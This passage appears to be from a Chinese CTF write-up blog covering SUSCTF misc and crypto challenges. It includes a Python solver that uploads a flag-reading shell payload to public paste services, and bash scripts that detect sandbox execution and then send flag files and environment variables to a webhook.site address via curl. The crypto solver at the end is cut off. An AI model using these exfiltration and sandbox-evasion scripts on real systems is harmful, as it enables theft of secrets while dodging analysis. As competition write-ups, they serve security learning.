class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">PAYLOAD = <span class="string">&quot;env -i PATH=/usr/bin:/bin sh -c &#x27;cat /flag&#x27;\n&quot;</span></span><br><span class="line">PRIMARY_ENDPOINT = <span class="string">&quot;https://0x0.st&quot;</span></span><br><span class="line">TMPFILES_ENDPOINT = <span class="string">&quot;https://tmpfiles.org/api/v1/upload&quot;</span></span><br><span class="line">PASTERS_ENDPOINT = <span class="string">&quot;https://paste.rs&quot;</span></span><br><span class="line">PIPFI_ENDPOINT = <span class="string">&quot;https://p.ip.fi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_multipart_request</span>(<span class="params">url: <span class="built_in">str</span>, field_name: <span class="built_in">str</span>, filename: <span class="built_in">str</span>, content: <span class="built_in">str</span></span>) -&gt; urllib.request.Request:</span><br><span class="line">    boundary = <span class="string">&quot;----ctf&quot;</span> + secrets.token_hex(<span class="number">8</span>)</span><br><span class="line">    body = []</span><br><span class="line">    body.append(<span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>\r\n&quot;</span>.encode())</span><br><span class="line">    body.append(</span><br><span class="line">        <span class="string">f&quot;Content-Disposition: form-data; name=\&quot;<span class="subst">&#123;field_name&#125;</span>\&quot;; filename=\&quot;<span class="subst">&#123;filename&#125;</span>\&quot;\r\n&quot;</span>.encode()</span><br><span class="line">    )</span><br><span class="line">    body.append(<span class="string">b&quot;Content-Type: text/plain\r\n\r\n&quot;</span>)</span><br><span class="line">    body.append(content.encode())</span><br><span class="line">    body.append(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    body.append(<span class="string">f&quot;--<span class="subst">&#123;boundary&#125;</span>--\r\n&quot;</span>.encode())</span><br><span class="line">    data = <span class="string">b&quot;&quot;</span>.join(body)</span><br><span class="line">    <span class="keyword">return</span> urllib.request.Request(</span><br><span class="line">        url,</span><br><span class="line">        data=data,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">f&quot;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_0x0</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = _multipart_request(PRIMARY_ENDPOINT, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;p.sh&quot;</span>, payload)</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;0x0.st 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_tmpfiles</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = _multipart_request(TMPFILES_ENDPOINT, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;p.sh&quot;</span>, payload)</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        data = response.read().decode().strip()</span><br><span class="line">    parsed = json.loads(data)</span><br><span class="line">    url = parsed[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;url&quot;</span>].replace(<span class="string">&quot;https://tmpfiles.org/&quot;</span>, <span class="string">&quot;https://tmpfiles.org/dl/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;tmpfiles 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_paste_rs</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = urllib.request.Request(</span><br><span class="line">        PASTERS_ENDPOINT,</span><br><span class="line">        data=payload.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;paste.rs 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_p_ip_fi</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    request = urllib.request.Request(</span><br><span class="line">        PIPFI_ENDPOINT,</span><br><span class="line">        data=payload.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-solver&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    ctx = ssl.create_default_context()</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(request, context=ctx, timeout=<span class="number">10</span>) <span class="keyword">as</span> response:</span><br><span class="line">        url = response.read().decode().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;p.ip.fi 返回异常：<span class="subst">&#123;url!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UPLOADERS = [</span><br><span class="line">    (<span class="string">&quot;0x0.st&quot;</span>, upload_0x0),</span><br><span class="line">    (<span class="string">&quot;tmpfiles&quot;</span>, upload_tmpfiles),</span><br><span class="line">    (<span class="string">&quot;paste.rs&quot;</span>, upload_paste_rs),</span><br><span class="line">    (<span class="string">&quot;p.ip.fi&quot;</span>, upload_p_ip_fi),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_payload</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    last_error: Exception | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> name, uploader <span class="keyword">in</span> UPLOADERS:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = uploader(payload)</span><br><span class="line">        <span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;name&#125;</span> 上传失败：<span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            last_error = err</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:  <span class="comment"># noqa: BLE001</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] <span class="subst">&#123;name&#125;</span> 上传异常：<span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            last_error = err</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span> 上传成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;所有上传方式均失败：<span class="subst">&#123;last_error&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(<span class="params">host: <span class="built_in">str</span>, port: <span class="built_in">int</span>, url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((host, port), timeout=<span class="number">5</span>) <span class="keyword">as</span> sock:</span><br><span class="line">        sock_file = sock.makefile(<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        buffer = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> buffer.endswith(<span class="string">b&quot;: &quot;</span>):</span><br><span class="line">            ch = sock_file.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ch:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;远端提前关闭连接&quot;</span>)</span><br><span class="line">            buffer += ch</span><br><span class="line">        sys.stdout.write(buffer.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        sock.sendall(url.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        remaining = sock_file.read()</span><br><span class="line">        <span class="keyword">return</span> remaining.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">output: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output.splitlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&quot;Script stdout:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> line.partition(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;SUSCTF misc 远程脚本沙箱解题脚本&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;题目主机&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;题目端口&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--payload-url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;直接指定已上传脚本的 URL&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload_url = args.payload_url <span class="keyword">or</span> upload_payload(PAYLOAD)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 使用脚本 URL: <span class="subst">&#123;payload_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    output = interact(args.host, args.port, payload_url)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line">    flag = extract_flag(output)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 输出中未找到 Flag，请确认脚本实际执行情况&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005220720914.png" alt="image-20251005220720914"></p><h3 id="curlbash"><a href="#curlbash" class="headerlink" title="curlbash"></a>curlbash</h3><p>用了webhook和gist持久化一个文件链接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 用 webhook.site 探测网络：能连=非沙箱；不能=沙箱</span></span><br><span class="line"><span class="built_in">set</span> +e</span><br><span class="line">curl -sI --connect-timeout 2 <span class="string">&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span> | grep -q <span class="string">&quot;^HTTP/&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    netok=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    netok=0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$netok</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># ==== 非沙箱：收集并外带 flag ====</span></span><br><span class="line">    WEBHOOK=<span class="string">&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span></span><br><span class="line"></span><br><span class="line">    fl=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /flag ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /flag)</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /flag.txt ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /flag.txt)</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f /app/flag ]; <span class="keyword">then</span></span><br><span class="line">        fl=<span class="string">&quot;<span class="subst">$(cat /app/flag)</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fl=<span class="string">&quot;Flag not found&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 避免 -e 因网络问题让脚本非0退出</span></span><br><span class="line">    <span class="built_in">set</span> +e</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方式1：POST 正文（不使用 shell 重定向；用管道把stdin喂给 curl）</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%s&#x27;</span> <span class="string">&quot;<span class="variable">$fl</span>&quot;</span> | curl -fsS -X POST --data-binary @- <span class="string">&quot;<span class="variable">$WEBHOOK</span>?type=flag&quot;</span> -o /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方式2：再发一个简短 HEAD/GET 方便在面板里直观看到（依然不做 shell 重定向）</span></span><br><span class="line">    curl -fsS <span class="string">&quot;<span class="variable">$WEBHOOK</span>?ping=1&quot;</span> -o /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> -e</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># ==== 沙箱：保持静默、无副作用 ====</span></span><br><span class="line">    :</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure><p>非预期出的</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005232401456.png" alt="image-20251005232401456"></p><h3 id="curlbash-revenge"><a href="#curlbash-revenge" class="headerlink" title="curlbash-revenge"></a>curlbash-revenge</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 区分“文件执行”(沙箱轮) vs “stdin 执行”(最终 curl|bash)：</span><br><span class="line"># 在 bash 里，脚本通过文件运行时 $0 是脚本路径；</span><br><span class="line"># 通过 stdin 运行时，$0 通常是 bash/sh（例如 &quot;bash&quot; 或 &quot;-bash&quot;）。</span><br><span class="line"></span><br><span class="line">case &quot;$0&quot; in</span><br><span class="line">  bash|-bash|sh|-sh)</span><br><span class="line">    # ===== 最终轮：通过 stdin 被执行（curl | bash） =====</span><br><span class="line"></span><br><span class="line">    # 收集 flag（尽量覆盖常见位置/变量）</span><br><span class="line">    fl=&quot;&quot;</span><br><span class="line">    if [ -n &quot;$FLAG&quot; ]; then</span><br><span class="line">      fl=&quot;$FLAG&quot;</span><br><span class="line">    elif [ -f /flag ]; then</span><br><span class="line">      fl=&quot;$(cat /flag)&quot;</span><br><span class="line">    elif [ -f /flag.txt ]; then</span><br><span class="line">      fl=&quot;$(cat /flag.txt)&quot;</span><br><span class="line">    elif [ -f /app/flag ]; then</span><br><span class="line">      fl=&quot;$(cat /app/flag)&quot;</span><br><span class="line">    else</span><br><span class="line">      fl=&quot;Flag not found&quot;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    # 发到你的 webhook（不用 shell 重定向；网络失败也不让脚本非0退出）</span><br><span class="line">    WEBHOOK=&quot;https://webhook.site/2427af48-d862-4776-92fb-2fe7e93af250&quot;</span><br><span class="line">    printf &#x27;%s&#x27; &quot;$fl&quot; | curl -fsS -X POST --data-binary @- &quot;$WEBHOOK?type=flag&quot; -o /dev/null || :</span><br><span class="line">    curl -fsS &quot;$WEBHOOK?ping=1&quot; -o /dev/null || :</span><br><span class="line">    ;;</span><br><span class="line"></span><br><span class="line">  *)</span><br><span class="line">    # ===== 沙箱轮：脚本从文件运行，保持静默无副作用 =====</span><br><span class="line">    :</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"># 明确成功退出</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005232438914.png" alt="image-20251005232438914"></p><h3 id="eat-mian"><a href="#eat-mian" class="headerlink" title="eat-mian"></a>eat-mian</h3><p>做一下替换然后去在线网站测试下就行</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006150525926.png" alt="image-20251006150525926"></p><p>susctf{Mag1Cal_P7epr0ces$er_087604c6048d}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="03-CrySignin"><a href="#03-CrySignin" class="headerlink" title="03-CrySignin"></a>03-CrySignin</h3><p>GPT</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221049585.png" alt="image-20251005221049585"></p><h3 id="04-Broadcast-1"><a href="#04-Broadcast-1" class="headerlink" title="04-Broadcast_1"></a>04-Broadcast_1</h3><p>AI出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, ast</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;106.14.191.23&quot;</span>   <span class="comment"># 远程服务地址</span></span><br><span class="line">PORT = <span class="number">53481</span>             <span class="comment"># 远程服务端口</span></span><br><span class="line">NUM_QUERIES = <span class="number">600</span>        <span class="comment"># 查询次数，可取&lt;=1096，样本越多恢复越稳健</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 连接服务并获取 Public Seed</span></span><br><span class="line">sock = socket.socket()</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line">data = sock.recv(<span class="number">1024</span>).decode()  <span class="comment"># 接收初始信息，包括种子</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Failed to receive data from server.&quot;</span>)</span><br><span class="line"><span class="comment"># 数据可能包含 &quot;Public Seed:&lt;seed&gt;\nGive me your choice&gt;&quot;</span></span><br><span class="line"><span class="comment"># 确保读到种子整行</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Public Seed:&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="comment"># 若首次未完整，则继续接收</span></span><br><span class="line">    more = sock.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    data += more</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析种子字符串</span></span><br><span class="line">lines = data.splitlines()</span><br><span class="line">seed_line = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&quot;Public Seed:&quot;</span>):</span><br><span class="line">        seed_line = line</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> seed_line <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Public Seed not found in server response.&quot;</span>)</span><br><span class="line">seed_value = seed_line.split(<span class="string">&quot;Public Seed:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Public Seed = <span class="subst">&#123;seed_value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 依照种子重建矩阵 A (128x128, 元素0-99)，并确保其可逆</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">rng = random.Random()</span><br><span class="line">rng.seed(seed_value.encode())  <span class="comment"># 注意按服务器相同行为，用 bytes 作为种子</span></span><br><span class="line">n = <span class="number">128</span></span><br><span class="line">p = <span class="number">31337</span></span><br><span class="line"><span class="comment"># 生成随机矩阵直至满秩</span></span><br><span class="line"><span 